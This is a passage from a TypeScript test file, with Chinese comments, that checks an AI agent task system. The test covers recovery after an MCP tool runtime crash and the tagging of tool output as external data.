          queueMicrotask(() => { void s.tasks.approve(ev.data.approval.id, 'allow', undefined, deviceId); });
        }
      });
      try {
        await s.tasks.prompt(taskId, '请调用 studio-echo');
        await s.tasks.idle();
      } finally {
        off();
      }

      expect(s.tasks.get(taskId).status).toBe('review');
      expect(modelCalls).toBe(3);
      // 关键：MCP 运行时崩溃没有导致 recovery_required = 1 锁死任务
      const indRow = s.db.get<{ recovery_required: number }>('SELECT recovery_required FROM independent_task_settings WHERE task_id = ?', taskId)!;
      expect(indRow.recovery_required).toBe(0);

      const toolMsgs = (seenBodies[2]?.messages ?? []).filter((m) => m.role === 'tool').map((m) => m.content ?? '');
      expect(toolMsgs[0]).toContain('<<<AIC-SOURCE:external_data>>>');
      expect(toolMsgs[0]).toContain('独立任务回声');
      expect(toolMsgs[0]).not.toContain('[AIC-SOURCE: producer]');
      expect(toolMsgs[1]).toContain('外部 MCP 工具调用失败');
      expect(toolMsgs[1]).toContain('<<<AIC-SOURCE:external_data>>>');

      const taskConn = TaskMcpConnections.parse((await gw.api('GET', `/tasks/${taskId}/mcp`, { token })).json);
      expect(taskConn.servers[0]).toMatchObject({ id: mcpId, activeForTask: true, lastCalledTool: 'echo' });
    }, 30_000);
  });
});
